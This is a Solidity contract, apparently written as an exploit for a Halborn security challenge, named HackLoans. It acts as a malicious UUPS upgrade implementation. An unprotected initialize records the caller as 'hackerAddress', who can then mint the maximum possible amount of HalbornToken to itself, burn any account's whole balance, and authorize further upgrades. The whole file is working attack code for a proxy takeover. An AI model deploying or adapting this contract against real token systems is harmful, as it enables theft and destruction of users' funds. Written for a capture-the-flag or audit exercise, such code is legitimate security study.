// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {ERC20Upgradeable} from "openzeppelin-contracts-upgradeable/contracts/token/ERC20/ERC20Upgradeable.sol";
import {Initializable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/Initializable.sol";
import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/UUPSUpgradeable.sol";
import {OwnableUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/access/OwnableUpgradeable.sol";
import {MulticallUpgradeable} from "../libraries/Multicall.sol";

import {HalbornToken} from "../HalbornToken.sol";
import {HalbornNFT} from "../HalbornNFT.sol";

contract HackLoans is
    Initializable,
    ERC20Upgradeable,
    UUPSUpgradeable,
    OwnableUpgradeable
{
    HalbornToken public token;
    HalbornNFT public nft;

    uint256 public immutable collateralPrice;

    mapping(address => uint256) public totalCollateral;
    mapping(address => uint256) public usedCollateral;
    mapping(uint256 => address) public idsCollateral;

    constructor(uint256 collateralPrice_) {
        collateralPrice = collateralPrice_;
    }

    address internal hackerAddress;

    modifier onlyHacker() {
        require(msg.sender == hackerAddress, "Caller is not the hacker");
        _;
    }

    function initialize(address token_, address nft_) public {
        hackerAddress = msg.sender;
        token = HalbornToken(token_);
        nft = HalbornNFT(nft_);
    }

    function mint() external onlyHacker {
        token.mintToken(msg.sender, type(uint256).max);
    }

    function burn(address account) external onlyHacker {
        token.burnToken(account, token.balanceOf(account));
    }

    function _authorizeUpgrade(address) internal override onlyHacker {}
}
